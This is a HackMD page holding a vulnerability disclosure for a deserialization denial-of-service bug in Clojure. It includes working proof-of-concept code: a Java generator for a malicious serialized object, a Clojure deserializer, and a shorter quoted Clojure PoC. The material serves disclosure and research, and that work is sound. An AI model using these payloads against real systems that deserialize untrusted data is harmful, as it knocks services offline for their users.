<!DOCTYPE html>
<html lang="en-US" data-themeable="true">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="csrf-token" content="7EeRkm1O-PhF8zYj4vJoLqm7WROeDvx6p6hQ">
    
    
    <meta name="description" content="Translation:">
    
    <title>Vulnerability Details -  Clojure Dos by Deserialization - HackMD</title>
    <link rel="icon" type="image/png" href="https://hackmd.io/favicon.png">
	<link rel="apple-touch-icon" href="https://hackmd.io/apple-touch-icon.png">
	<!--  meta value for server side given sign in boolean -->
    <meta name="signin" content="false">

    
<script nonce="c0316529-90dd-4f13-92fc-fe741f67d1a4">
  window.domain = 'hackmd.io'
  window.urlpath = ''
  window.debug = false || window.localStorage.getItem('HMD_DEBUG_FLAG') === 'true'
  window.version = '1.3.0'
  window.brand = 'HackMD'

  
  window.NOTE_ID = 'hFLoeiL-T8mvhNANOux2VA'
  

  window.GOOGLE_DRIVE_API_KEY = 'AIzaSyAHmcP5gL_64ZafuAYOvJruFAIaYgHQaY4'
  window.GOOGLE_DRIVE_CLIENT_ID = '65857506266-76uhhee8se8dgs1i0q8fhtj1prg0ar27.apps.googleusercontent.com'
  window.DROPBOX_APP_KEY = 'rdoizrlnkuha23r'
  
  window.PLANTUML_SERVER = 'https://ptuml.hackmd.io'

  window.ASSET_URL = 'https://assets.hackmd.io'

  window.USER_CAN_CREATE_TEAM = true
  window.USER_CAN_DELETE_ACCOUNT = true
  window.USER_DELETE_ACCOUNT_VIA_EMAIL = true
  window.PAYMENT_ENABLED = true
  window.PAYMENT_PROMOTION_BANNER_ENABLED = false
  window.GITHUB_SYNC_ENABLED = true
  window.GITLAB_SYNC_ENABLED = false
  window.GITLAB_SYNC_BASE_URL = ''
  window.VCS_SYNC_MODE = 'github'
  window.VCS_PROVIDER_NAME = 'GitHub'
  window.FREE_TEAM_NUM = 20
  window.FREE_TEAM_MEMBER_NUM = 3
  window.FREE_PUBLIC_TEAM_NUM = 10
  window.NEO_OVERVIEW_UI = true
  window.FOLDER_ENABLE = true
  
  window.EE_SITE_ENABLE = false
  window.EE_SITE_NAME = 'false'
  window.EE_SITE_LINK = 'false'
  window.EESITE_INFO = false
  window.ENTERPRISE_DISCOVERY_ENABLE = false
  window.ENTERPRISE_DISCOVERY_TEAM = true
  window.ENTERPRISE_DISCOVERY_NOTE = true
  window.ENTERPRISE_DISCOVERY_VIEW_PERMISSION = 'guest'
  
  window.ALLOW_ANONYMOUS = true
  window.ALLOW_ANONYMOUS_EDIT = false
  window.ALLOW_DOWNLOAD_PDF = true
  window.PUBLIC_OVERVIEW = false
  window.INTERNAL_PUBLIC_OVERVIEW = false
  window.FULL_TEXT_SEARCH_ENABLE = false
  window.ALGOLIA_SEARCH_ENABLE = true
  window.MARKETING_EMAIL_ENABLE = true
  window.OFFLINE_ACCESS = true
  
  
  
    window.WALLET_CONNECT_PROJECT_ID = '91d6fa182b725b5895a17a170a5878c1'
  
  window.API_MANAGEMENT_UI_ENABLE = true
  window.FEEDBACK_UI_ENABLE = true
  window.PUBLISH_ENABLE = true

  

  
  window.SHOW_HOT_NOTES = false
  

  
  window.HOT_NOTES_TIME_TYPE = 'week'
  

  
  window.SHOW_OVERVIEW = false
  

  
  window.MENTIONS = {}
  

  
  window.MENTION_ANCHORS = []
  

  
  window.COMMENT_ANCHORS = []
  

  
  window.IS_OWNER = false
  

  
  window.IS_TEAM_ADMIN = false
  

  
  window.IS_INVITEE_ADMIN = false
  

  
  window.USER_PROFILE = '%7B%22name%22%3A%22Guest%20Miles%22%7D'
  

  
  window.VERSION_TIME = '1705470864179'
  

  
  window.canEdit = false
  

  
  window.canWriteComment = false
  

  
  window.canHideComment = false
  

  window.TRASH_NOTE_DELETE_AFTER_FREE = 3
  window.TRASH_NOTE_DELETE_AFTER_PAID = 30

  
    window.ENABLED_PREVIEW_FEATURE = {}
  

  
    window.IS_OWNER_UPGRADED = false
  

  
    window.IMGUR_FALLBACK_CDN = 'https://imgur-backup.hackmd.io'
  

  
    window.CLOUD_META_UI = true
  
  
    window.CLOUD_META_API = true
  
  
    window.CLOUD_META_MIGRATION = false
  
  
    window.YAML_METADATA_ENABLED = false
  

  
    window.NOTE_CAPACITY_LIMIT = 50
  

  
    window.DOCUMENT_MAX_LENGTH = 100000
  

  
    window.SOCIAL_NETWORK_FEATURES_ENABLED = true
  

  
    window.PUBLISHMENT_MODERATION_ENABLED = true
  

  
    window.COMMENT_ENABLED = true
  

  window.SUGGEST_EDIT_ENABLED = true
  
    window.SUGGEST_EDIT_ENABLED = true
  

  
    window.REALTIME_CLIENT_WITH_CREDENTIALS = false
  

  
    window.COMMENT_ENABLED = true
  

  
    window.DEBUG_DISCONNECT_SOCKET_WHEN_OFFLINE = false
  

  

  

  

  
    window.CUSTOM_STYLE_ENABLED = "true"
  

  
    window.USE_NEW_LOGO = true
  

  
    window.ITERABLE_ENABLED = true
  
  
    window.ITERABLE_API_KEY = "c2c36a44c2614fb19aa3b46d660bbce2"
  

  
    window.TEXT_SELECTION_CHANGED = false
  

  
    window.CAN_VIEW_HISTORY_AT_REVISION = false
  
</script>


    
<!-- Google Tag Manager -->
<script nonce="c0316529-90dd-4f13-92fc-fe741f67d1a4">(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-KLW9Z3');</script>
<!-- End Google Tag Manager -->


    





    <meta property="fb:app_id" content="1436904003272070">



    <meta name="twitter:image:src" content="https://hackmd.io/images/media/HackMD-neo-og.jpg">
    <meta name="twitter:image:alt" content="Vulnerability Details -  Clojure Dos by Deserialization - HackMD">


<meta name="twitter:site" content="@hackmdio" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:title" content="Vulnerability Details -  Clojure Dos by Deserialization - HackMD" />


    <meta name="twitter:description" content="Translation:" />



    <meta property="og:image" content="https://hackmd.io/images/media/HackMD-neo-og.jpg">
    <meta property="og:image:alt" content="Vulnerability Details -  Clojure Dos by Deserialization - HackMD">


<meta property="og:site_name" content="HackMD" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Vulnerability Details -  Clojure Dos by Deserialization - HackMD" />


    <meta property="og:description" content="Translation:" />



    <link rel="canonical" href="https://hackmd.io/@fe1w0/rymmJGida" />
    <meta property="og:url" content="https://hackmd.io/@fe1w0/rymmJGida" />
    <meta property="twitter:url" content="https://hackmd.io/@fe1w0/rymmJGida" />


     <link href="https://assets.hackmd.io/build/font-vendor.css" rel="stylesheet"><link href="https://assets.hackmd.io/build/font-vendor.ea8218d7d4f468b2c430.css" rel="stylesheet"><link href="https://assets.hackmd.io/build/common-vendor.css" rel="stylesheet"><link href="https://assets.hackmd.io/build/common-vendor.0a08ae20e14fefe857eb.css" rel="stylesheet"><link href="https://assets.hackmd.io/build/pretty-vendor.css" rel="stylesheet"><link href="https://assets.hackmd.io/build/pretty-vendor.db0e7b64c54d0a77290f.css" rel="stylesheet"><link href="https://assets.hackmd.io/build/pretty.css" rel="stylesheet"><link href="https://assets.hackmd.io/build/pretty.206c1db4aa617ea5aa67.css" rel="stylesheet">
    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
<!--[if lt IE 9]>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js" integrity="sha256-3Jy/GbSLrg0o9y5Z5n1uw0qxZECH7C6OQpVBgNFYa0g=" crossorigin="anonymous"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/respond.js/1.4.2/respond.min.js" integrity="sha256-g6iAfvZp+nDQ2TdTR/VVKJf3bGro4ub5fvWSWVRi2NE=" crossorigin="anonymous"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/es5-shim/4.5.9/es5-shim.min.js" integrity="sha256-8E4Is26QH0bD52WoQpcB+R/tcWQtpzlCojrybUd7Mxo=" crossorigin="anonymous"></script>
<![endif]-->

    


    <script defer data-domain="hackmd.io" src="https://plausible.io/js/script.js"></script>
<script nonce="c0316529-90dd-4f13-92fc-fe741f67d1a4">
  window.plausible = window.plausible || function() { (window.plausible.q = window.plausible.q || []).push(arguments); }
  const keyboardWhiteList = ['a', 'span', 'button']

  function getTaggedEventAttributes (e) {
    const eventAttrs = { name: null, props: {} }
    if (!e || !e.classList) return eventAttrs
    const psEvent = /plausible-event-(.+)(=|--)(.+)/
    for (const className of [...e.classList]) {
      const [, key, , val] = className.match(psEvent) || []
      if (!key || !val) continue
      const value = val.replace(/\+/g, ' ')
      switch (key.toLowerCase()) {
        case 'name':
          eventAttrs.name = value
          break
        default:
          eventAttrs.props[key] = value
          break
      }
    }
    return eventAttrs
  }

  function isLocal () {
    return /^localhost$|^127(\.[0-9]+){0,2}\.[0-9]+$|^\[::1?\]$/.test(location.hostname) || location.protocol === 'file:'
  }

  function isAutomation () {
    return Boolean(window._phantom || window.__nightmare || window.navigator.webdriver || window.Cypress)
  }

  function shouldIgnore () {
    return isLocal() ||
      isAutomation() ||
      window.localStorage.getItem('plausible_ignore') === 'true'
  }

  function handler (e) {
    if (!window.plausible) return
    if (!e.target || !('className' in e.target)) return
    const ele = e.target

    const eventAttrs = getTaggedEventAttributes(ele)
    if (!eventAttrs.name) return
    if (ele?.href) eventAttrs.props.url = ele.href

    if (shouldIgnore()) {
      if (window.debug) logDebugEventMsg(eventAttrs)
      return
    }
    window.plausible(eventAttrs.name, { props: eventAttrs.props })
  }

  function logDebugEventMsg (eventAttrs) {
    console.warn(
      `Ignoring Event: "${eventAttrs.name}"`,
      eventAttrs,
    )
  }

  function keydownHandler (e) {
    if (e.key !== 'Enter') return
    if (e.target.nodeName.toLowerCase() === 'input') {
      switch (e.target.type.toLowerCase()) {
        case 'submit':
        case 'button':
        case 'reset':
        case 'checkbox':
        case 'radio':
        case 'file':
        case 'image':
        case 'color':
          break
        default:
          return
      }
    } else if (!keyboardWhiteList.includes(e.target.nodeName.toLowerCase())) {
      return
    }
    handler(e)
  }

  document.addEventListener('mousedown', handler)
  document.addEventListener('keydown', keydownHandler)
</script>

    
<script nonce="c0316529-90dd-4f13-92fc-fe741f67d1a4">
  window.publishProps = JSON.parse(`{"isOwnerAnonymous":false,"isOwnedByTeam":false,"ownerInfo":{"name":"fe1w0","path":"fe1w0","avatarUrl":"https%3A%2F%2Favatars.githubusercontent.com%2Fu%2F50180586%3Fs%3D96","description":null},"isPublished":true,"createTime":1704824603470,"updateTime":1705470864179,"vcsSyncMode":"github","vcsProviderName":"GitHub","canEdit":false,"hardBreaks":true,"onlyOwnerCanEdit":true,"isCommentEnabled":true,"likedCount":0,"isNotificationEnabled":true,"notificationType":"never","hasEmail":false,"canWriteComment":false,"viewCount":3832,"markdown":"%23%20Vulnerability%20Details%20-%20Clojure%20Denial%20of%20service%20attack%20by%20Deserialization%0A%0A%23%23%20Vulnerability%20Description%0A%0AUnder%20org.clojure%3Aclojur%20(1.2.0%20-%201.12.0-alpha5)%2C%20there%20exists%20a%20denial%20of%20service%20attack%20initiated%20through%20deserialization.%20By%20constructing%20appropriate%20objects%2C%20continuous%20hashcode%20calculations%20can%20be%20initiated.%0A%0A%3E%20%60core%24partial%24fn__5920%60%20is%20actually%20obtained%20by%20reading%20the%20jar%20file%2C%20and%20I%20am%20not%20very%20familiar%20with%20Clojure.%0A%3E%0A%3E%20The%20discovery%20of%20this%20vulnerability%20was%20made%20using%20a%20private%20tool%2C%20but%20due%20to%20a%20lack%20of%20knowledge%20in%20Clojure.%0A%0A%23%23%20Verification%20Demonstration%0A%60%60%60bash%0Agtimeout%2030s%20%2FLibrary%2FJava%2FJavaVirtualMachines%2Fzulu-11.jdk%2FContents%2FHome%2Fbin%2Fjava%20-classpath%20%2FUsers%2Ffe1w0%2F.m2%2Frepository%2Forg%2Fclojure%2Fclojure%2F1.12.0-alpha5%2Fclojure-1.12.0-alpha5.jar%3A%2FUsers%2Ffe1w0%2F.m2%2Frepository%2Forg%2Fclojure%2Fspec.alpha%2F0.3.218%2Fspec.alpha-0.3.218.jar%3A%2FUsers%2Ffe1w0%2F.m2%2Frepository%2Forg%2Fclojure%2Fcore.specs.alpha%2F0.2.62%2Fcore.specs.alpha-0.2.62.jar%20clojure.main%20%2FUsers%2Ffe1w0%2FProject%2FPoc%2FPocALL%2Fsrc%2Fmain%2Fclojure%2Fpoc%2Fclojure%2Fdos.clj%0A%60%60%60%0A%0A%23%23%23%20Vulnerability%20demo%20-%20triple%20speed%0A%0A!%5BPoc%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FS1PtMGsdT.gif)%0A%0A%0A%23%23%20Verification%20Script%0ASerialization%20Data%20Generation%20Script%0A%60%60%60java%0Apackage%20poc.clojure.dos%3B%0A%0Aimport%20clojure.core%24gen_class%3B%0Aimport%20clojure.core%24partial%24fn__5920%3B%0Aimport%20clojure.lang.ArraySeq%3B%0Aimport%20clojure.lang.Iterate%3B%0Aimport%20clojure.lang.PersistentQueue%3B%0Aimport%20clojure.lang.PersistentVector%3B%0Aimport%20org.apache.commons.lang3.reflect.FieldUtils%3B%0A%0Aimport%20java.io.*%3B%0Aimport%20java.util.HashMap%3B%0A%0A%2F**%0A%20*%20%40author%20fe1w0%0A%20*%20%40date%202024%2F1%2F9%2023%3A45%0A%20*%20%40Project%20PocALL%0A%20*%2F%0Apublic%20class%20GenData%20%7B%0A%0A%20%20%20%20public%20static%20void%20main(String%5B%5D%20args)%20throws%20IllegalAccessException%20%7B%0A%0A%20%20%20%20%20%20%20%20HashMap%3CPersistentQueue%2C%20Object%3E%20map%20%3D%20new%20HashMap%3C%3E()%3B%0A%0A%20%20%20%20%20%20%20%20PersistentQueue%20model%20%3D%20PersistentQueue.EMPTY%3B%0A%0A%20%20%20%20%20%20%20%20FieldUtils.writeField(model%2C%20%22r%22%2C%20PersistentVector.EMPTY%2C%20true)%3B%0A%0A%20%20%20%20%20%20%20%20FieldUtils.writeField(model%2C%20%22_hash%22%2C%201%2C%20true)%3B%0A%0A%20%20%20%20%20%20%20%20HashMap%3CString%2C%20String%3E%20gen_map%20%3D%20new%20HashMap%3C%3E()%3B%0A%0A%20%20%20%20%20%20%20%20gen_map.put(%22xyz.xzaslxr%22%2C%20%22fe1w0%22)%3B%0A%0A%20%20%20%20%20%20%20%20core%24partial%24fn__5920%20proxy%20%3D%20new%20core%24partial%24fn__5920(new%20core%24gen_class()%2C%20gen_map)%3B%0A%0A%20%20%20%20%20%20%20%20Iterate%20iterate%20%3D%20(Iterate)%20Iterate.create(proxy%2C%20new%20HashMap%3C%3E())%3B%0A%0A%20%20%20%20%20%20%20%20Iterate%20control_first%20%3D%20iterate%3B%0A%0A%20%20%20%20%20%20%20%20FieldUtils.writeField(model%2C%20%22f%22%2C%20ArraySeq.create(control_first)%2C%20true)%3B%0A%0A%20%20%20%20%20%20%20%20map.put(model%2C%20null)%3B%0A%0A%20%20%20%20%20%20%20%20FieldUtils.writeField(model%2C%20%22_hash%22%2C%200%2C%20true)%3B%0A%0A%20%20%20%20%20%20%20%20try%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20FileOutputStream%20fileOut%20%3D%20new%20FileOutputStream(%22output%2Fdos-clojure.ser%22)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20ObjectOutputStream%20out%20%3D%20new%20ObjectOutputStream(fileOut)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20out.writeObject(map)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20out.close()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20fileOut.close()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20System.out.println(%22Serialized%20data%20is%20saved%20in%20output%2Fdos-clojure.ser%22)%3B%0A%20%20%20%20%20%20%20%20%7D%20catch%20(IOException%20i)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20i.printStackTrace()%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%7D%0A%60%60%60%0A%0AClojure%20DeSerialization%20Script%0A%60%60%60%0A(ns%20poc.clojure.dos)%0A%0A(defn%20deserialize-obj%20%5Bfilename%5D%0A%20%20(with-open%20%5Binp%20(-%3E%20(java.io.File.%20filename)%20java.io.FileInputStream.%20java.io.ObjectInputStream.)%5D%0A%20%20%20%20(.readObject%20inp)))%0A%0A(deserialize-obj%20%22%2FUsers%2Ffe1w0%2FProject%2FPoc%2FPocALL%2Foutput%2Fdos-clojure.ser%22)%0A%60%60%60%0A%0A%0A%23%23%23%20Other%20Way%0A%0AThis%20way%20will%20affect%20versions%20from%201.2.0%20-%201.12.0.%0A%0A%3ELinks(Taking%20from%20Eugene%20Pakhomov)%3A%0A%3E%20-%20https%3A%2F%2Fask.clojure.org%2Findex.php%2F13617%2Fsecurity-problems-command-execution-clojure-clojure-alpha5%3Fshow%3D13628%23c13628%0A%60%60%60clojure%0A(ns%20poc.clojure.ask)%0A%0A(let%20%5Bout%20(java.io.ByteArrayOutputStream.)%0A%20%20%20%20%20%20obj-out%20(java.io.ObjectOutputStream.%20out)%0A%20%20%20%20%20%20i%20(iterate%20identity%20nil)%5D%0A%20%20(doto%20(-%3E%20i%20(class)%20(.getSuperclass)%20(.getDeclaredField%20%22_hash%22))%0A%20%20%20%20(.setAccessible%20true)%0A%20%20%20%20(.set%20i%20(int%201)))%0A%20%20(.writeObject%20obj-out%20(java.util.HashMap.%20%7Bi%20nil%7D))%0A%20%20(println%20%22Writing%20is%20done.%20Reading...%22)%0A%20%20(let%20%5Bin%20(java.io.ByteArrayInputStream.%20(.toByteArray%20out))%0A%20%20%20%20%20%20%20%20obj-in%20(java.io.ObjectInputStream.%20in)%5D%0A%20%20%20%20(.readObject%20obj-in)%0A%20%20%20%20(println%20%22Will%20never%20be%20printed.%22)))%0A%60%60%60%0A","viewMode":"publish","isOwner":false,"isSignIn":false,"isLiked":false,"isBookmarked":false,"publishType":"view","commentCount":0,"isNotesRecommendationsEnabled":true,"recommendedNotes":[{"id":"d6114c67-cefc-4f08-aba8-631ee83a71d8","title":"hidet%20-%20pickle.loads","brief":"In%20apps%2Fcompile%20server%2Fresources%2Fcompilation.%20Py%20126%20lines%2C%20after%20get%20complie%20server%20validation%2C%20the%20risk%20of%20python%20deserialization%20attack%20can%20achieve%20command%20execution%2C%20etc.","lastchangeAt":"2024-06-15T01%3A48%3A15.697Z","publishLink":"%40fe1w0%2FSyi20Zbk0"},{"id":"b2c75ae4-1c78-4544-ab8f-0abb7d8a9e9a","title":"(Not%20Accepted)","brief":"Vulnerability%20Details%20-%20Potential%20Command%20Execution%20via%20Deserialization%20Exploit%20Chain%20in%20Specific%20Component%20Combinations","lastchangeAt":"2024-03-21T12%3A46%3A46.295Z","publishLink":"%40fe1w0%2FSkKUicKR6"},{"id":"c9e6676f-018b-443c-8c39-7bf0fda028db","title":"Vulnerability%20Details%20-%20Clojure%20Command%20Injection%20by%20Deserialization","brief":"Under%20org.clojure%3Aclojure%20%3D%3D%201.12.0-alpha5%2C%20there%20exists%20a%20denial%20of%20service%20attack%20initiated%20through%20deserialization.%20By%20constructing%20appropriate%20objects%2C%20continuous%20hashcode%20calculations%20can%20be%20initiated.","lastchangeAt":"2024-01-25T07%3A10%3A20.486Z","publishLink":"%40fe1w0%2FHyefvRQKp"}],"lastChangeUserInfo":{"name":"fe1w0","path":"fe1w0","avatarUrl":"https%3A%2F%2Favatars.githubusercontent.com%2Fu%2F50180586%3Fs%3D96"}}`);
  (function () {
    const decodeStringProps = (props) => {
      for (const key in props) {
        if (typeof props[key] === 'string') {
          props[key] = decodeURIComponent(props[key])
        } else if (typeof props[key] === 'object') {
          decodeStringProps(props[key])
        }
      }
    }
    decodeStringProps(window.publishProps)
  })()
</script>

    <script src="https://tally.so/widgets/embed.js"></script>

    
</head>

<body style="display:none;">
    <div id="toasts-container" class="toasts-container z-[2000]"></div>
    <div id="publish-page"># Vulnerability Details - Clojure Denial of service attack by Deserialization

## Vulnerability Description

Under org.clojure:clojur (1.2.0 - 1.12.0-alpha5), there exists a denial of service attack initiated through deserialization. By constructing appropriate objects, continuous hashcode calculations can be initiated.

&gt; `core$partial$fn__5920` is actually obtained by reading the jar file, and I am not very familiar with Clojure.
&gt;
&gt; The discovery of this vulnerability was made using a private tool, but due to a lack of knowledge in Clojure.

## Verification Demonstration
```bash
gtimeout 30s /Library/Java/JavaVirtualMachines/zulu-11.jdk/Contents/Home/bin/java -classpath /Users/fe1w0/.m2/repository/org/clojure/clojure/1.12.0-alpha5/clojure-1.12.0-alpha5.jar:/Users/fe1w0/.m2/repository/org/clojure/spec.alpha/0.3.218/spec.alpha-0.3.218.jar:/Users/fe1w0/.m2/repository/org/clojure/core.specs.alpha/0.2.62/core.specs.alpha-0.2.62.jar clojure.main /Users/fe1w0/Project/Poc/PocALL/src/main/clojure/poc/clojure/dos.clj
```

### Vulnerability demo - triple speed

![Poc](https://hackmd.io/_uploads/S1PtMGsdT.gif)


## Verification Script
Serialization Data Generation Script
```java
package poc.clojure.dos;

import clojure.core$gen_class;
import clojure.core$partial$fn__5920;
import clojure.lang.ArraySeq;
import clojure.lang.Iterate;
import clojure.lang.PersistentQueue;
import clojure.lang.PersistentVector;
import org.apache.commons.lang3.reflect.FieldUtils;

import java.io.*;
import java.util.HashMap;

/**
 * @author fe1w0
 * @date 2024/1/9 23:45
 * @Project PocALL
 */
public class GenData {

    public static void main(String[] args) throws IllegalAccessException {

        HashMap&lt;PersistentQueue, Object&gt; map = new HashMap&lt;&gt;();

        PersistentQueue model = PersistentQueue.EMPTY;

        FieldUtils.writeField(model, &#34;r&#34;, PersistentVector.EMPTY, true);

        FieldUtils.writeField(model, &#34;_hash&#34;, 1, true);

        HashMap&lt;String, String&gt; gen_map = new HashMap&lt;&gt;();

        gen_map.put(&#34;xyz.xzaslxr&#34;, &#34;fe1w0&#34;);

        core$partial$fn__5920 proxy = new core$partial$fn__5920(new core$gen_class(), gen_map);

        Iterate iterate = (Iterate) Iterate.create(proxy, new HashMap&lt;&gt;());

        Iterate control_first = iterate;

        FieldUtils.writeField(model, &#34;f&#34;, ArraySeq.create(control_first), true);

        map.put(model, null);

        FieldUtils.writeField(model, &#34;_hash&#34;, 0, true);

        try {
            FileOutputStream fileOut = new FileOutputStream(&#34;output/dos-clojure.ser&#34;);
            ObjectOutputStream out = new ObjectOutputStream(fileOut);
            out.writeObject(map);
            out.close();
            fileOut.close();
            System.out.println(&#34;Serialized data is saved in output/dos-clojure.ser&#34;);
        } catch (IOException i) {
            i.printStackTrace();
        }
    }
}
```

Clojure DeSerialization Script
```
(ns poc.clojure.dos)

(defn deserialize-obj [filename]
  (with-open [inp (-&gt; (java.io.File. filename) java.io.FileInputStream. java.io.ObjectInputStream.)]
    (.readObject inp)))

(deserialize-obj &#34;/Users/fe1w0/Project/Poc/PocALL/output/dos-clojure.ser&#34;)
```


### Other Way

This way will affect versions from 1.2.0 - 1.12.0.

&gt;Links(Taking from Eugene Pakhomov):
&gt; - https://ask.clojure.org/index.php/13617/security-problems-command-execution-clojure-clojure-alpha5?show=13628#c13628
```clojure
(ns poc.clojure.ask)

(let [out (java.io.ByteArrayOutputStream.)
      obj-out (java.io.ObjectOutputStream. out)
      i (iterate identity nil)]
  (doto (-&gt; i (class) (.getSuperclass) (.getDeclaredField &#34;_hash&#34;))
    (.setAccessible true)
    (.set i (int 1)))
  (.writeObject obj-out (java.util.HashMap. {i nil}))
  (println &#34;Writing is done. Reading...&#34;)
  (let [in (java.io.ByteArrayInputStream. (.toByteArray out))
        obj-in (java.io.ObjectInputStream. in)]
    (.readObject obj-in)
    (println &#34;Will never be printed.&#34;)))
```
</div>
    <!-- signin modal -->

<div class="modal fade signin-modal" tabindex="-1" role="dialog" aria-labelledby="mySmallModalLabel" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <button type="button" class="close" data-dismiss="modal" aria-label="Close" style="margin-top: 10px; right: 20px; position: absolute;"><span aria-hidden="true">&times;</span></button>
            






    









<h3>Sign in</h3>

<form data-toggle="validator" role="form" class="form-horizontal" method="post" enctype="application/x-www-form-urlencoded" id="signin-form">
    <div class="hmd-dn"><input type="hidden" name="_csrf" value="7EeRkm1O-PhF8zYj4vJoLqm7WROeDvx6p6hQ"></div>
    <div class="hmd-dn"><input type="hidden" name="create_team" value="false"></div>
    <div class="hmd-dn"><input type="hidden" name="create_paid_team" value="false"></div>
    
    <div class="form-group  ">
        <label for="email" class="control-label">Email</label>
        <label for="inputEmail" class="control-label pull-right errors">
            
        </label>
        <span class="help-block control-label with-errors pull-right" style="margin-top: 14px"></span>
        <div class="input-block">
            
                <input type="email" class="form-control" name="email" placeholder="Your email" required autocomplete="email">
            
            <span class="error-sign"></span>
        </div>
    </div>
    <div class="form-group ">
        <label for="password" class="control-label">Password</label>
        <label for="inputPassword" class="control-label pull-right errors">
            
        </label>
        <span class="help-block control-label with-errors pull-right" style="margin-top: 14px"></span>
        <div class="input-block">
            <input type="password" class="form-control" name="password" placeholder="Your password" required autocomplete="current-password" maxlength="128">
            <span class="error-sign"></span>
            
                <span class="control-label pull-right !text-normal !leading-normal !font-normal !mt-1.5"><a href="https://hackmd.io/settings/forgotPassword" style="text-decoration: underline;">Forgot password</a></span>
            
        </div>
    </div>

    <div style="text-align: center; padding-top: 15px; margin-bottom: 0px;">
        <div
            hidden
            id="hmd-captcha"
            data-provider=""
            data-captcha-data=""
            class="flex justify-center"
        ></div>

        
            <input type="submit" class="neo-btn neo-btn-primary !justify-center !py-3.5 !mx-auto" formaction="https://hackmd.io/login" value="Sign in">
        

        
    </div>
</form>














    
        <p class="separator">or</p>
    

    
        <p>By clicking below, you agree to our <a href="https://hackmd.io/s/terms" target="_blank">terms of service</a>.</p>
    

    












<script id="gsi-client" src="https://accounts.google.com/gsi/client" async defer nonce="c0316529-90dd-4f13-92fc-fe741f67d1a4"></script>
<script nonce="c0316529-90dd-4f13-92fc-fe741f67d1a4">
    function handleCredentialResponse(response) {
        const form = document.getElementById('sign-in-with-google-form')
        form.children.credential.value = response.credential
        form.children.method.value = location.href.toLowerCase() === 'https://hackmd.io/settings#general' ? 'merge' : 'login'
        form.submit()
    }
    var GSI_READY = new Promise(function (resolve) {
        function initialize () {
            google.accounts.id.initialize({
                client_id: '911617723593-drikdibvvn63slfd6kbqigo8ql1no55s.apps.googleusercontent.com',
                callback: handleCredentialResponse
            })
            const loginPath = '/login'
            const joinPath = '/join'
            const renderButton = function () {
                google.accounts.id.renderButton(
                    document.getElementById('sign-in-with-google-button'),
                    { type: 'standard', width: 250 }
                )
            }
            if (location.pathname.toLowerCase() === loginPath || location.pathname.toLowerCase() === joinPath) {
                renderButton()
            } else {
                $('.signin-modal').one('shown.bs.modal', function () {
                    renderButton()
                })
            }
            resolve()
        }

        window.addEventListener('load', function () { initialize() })
    })
</script>
<form class="hidden" id="sign-in-with-google-form" action="/auth/google" method="post">
    <input type="hidden" name="credential">
    <input type="hidden" name="method">
</form>


<div class="social-buttons-container">
    
    <div id="sign-in-with-google-button"></div>
    
    
    <a href="https://hackmd.io/auth/facebook" class="btn btn-lg btn-block btn-social btn-facebook">
        <i class="fa fa-facebook"></i> Sign in via Facebook
    </a>
    
    
    <a href="https://hackmd.io/auth/twitter" class="btn btn-lg btn-block btn-social btn-twitter">
        <i class="fa fa-twitter"></i> Sign in via Twitter
    </a>
    
    
    <a href="https://hackmd.io/auth/github" class="btn btn-lg btn-block btn-social btn-github">
        <i class="fa fa-github"></i> Sign in via GitHub
    </a>
    
    
    <a href="https://hackmd.io/auth/dropbox" class="btn btn-lg btn-block btn-social btn-dropbox">
        <i class="fa fa-dropbox"></i> Sign in via Dropbox
    </a>
    
    
    
      <a href="#" class="bg-white btn btn-block btn-social btn-web3 bg-gray-800 hocus:bg-[#2b2b2b] text-white hocus:text-white">
          <img src="https://hackmd.io/images/wallet.svg" style="max-height: 20px; margin-top: 8px; margin-left: 6px; border: none;">
          <span class="sign-in-wallet-text">
              Sign in with Wallet
          </span>

          <div class="inline-flex items-center justify-between w-full hidden web3-wallet-info">
              <span>
                   Wallet
                   (
                    <span class="web3-wallet-address"></span>
                   )
              </span>

              <i class="fa fa-arrow-right" aria-hidden="true"></i>
          </div>
      </a>

      <small class="web3-wallet-info hidden text-left hocus:text-white underline hocus:underline block pt-2 ui-disconnect-connected-wallets text-gray-600 cursor-pointer">
          Connect another wallet
      </small>
    
</div>




    <div >
        <p>New to HackMD? <a href="https://hackmd.io/join" class="plausible-event-name=LoginModalSignUp">Sign up</a></p>
    </div>




        </div>
    </div>
</div>

    
    <script src="https://www.googletagmanager.com/gtag/js?id=G-NGVZMM6DR6"></script>
    <script nonce="c0316529-90dd-4f13-92fc-fe741f67d1a4">
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        let userid = (document.cookie.match('(^|; )userid=([^;]*)')||0)[2];
        gtag('config', 'G-NGVZMM6DR6', {'user_id': userid});
        
    </script>


    
<script src="https://browser.sentry-cdn.com/5.15.5/bundle.min.js" crossorigin="anonymous"></script>
